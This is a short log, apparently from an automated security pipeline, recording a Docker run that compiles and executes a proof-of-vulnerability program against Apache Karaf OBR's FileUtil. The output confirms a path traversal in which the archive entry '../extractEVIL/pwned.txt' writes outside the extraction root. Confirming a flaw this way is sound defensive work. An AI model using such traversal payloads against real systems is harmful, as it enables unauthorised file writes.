@@ -1,0 +1,11 @@
+$ docker run --rm -v /Users/mohsen/dev/personal/autosec/security_pipeline_runs/20260717_042153_finding-93146093deb4/worktree:/workspace/repo -w /workspace/repo simpleautosec-finding-93146093deb4:a27710aa4208 bash -lc mkdir -p /tmp/pov-build && javac -d /tmp/pov-build obr/src/main/java/org/apache/karaf/obr/command/util/FileUtil.java .security-pipeline/pov/PathTraversalPOV.java && java -cp /tmp/pov-build PathTraversalPOV
+exit_code=0
+timed_out=false
+
+--- stdout ---
+Extraction root: /tmp/obr-pov-2555073550678882925/extract
+Expected escape target (outside root): /tmp/obr-pov-2555073550678882925/extractEVIL/pwned.txt
+VULNERABLE: crafted archive entry '../extractEVIL/pwned.txt' escaped the extraction root and wrote a file at /tmp/obr-pov-2555073550678882925/extractEVIL/pwned.txt (outside /tmp/obr-pov-2555073550678882925/extract).
+
+--- stderr ---
+
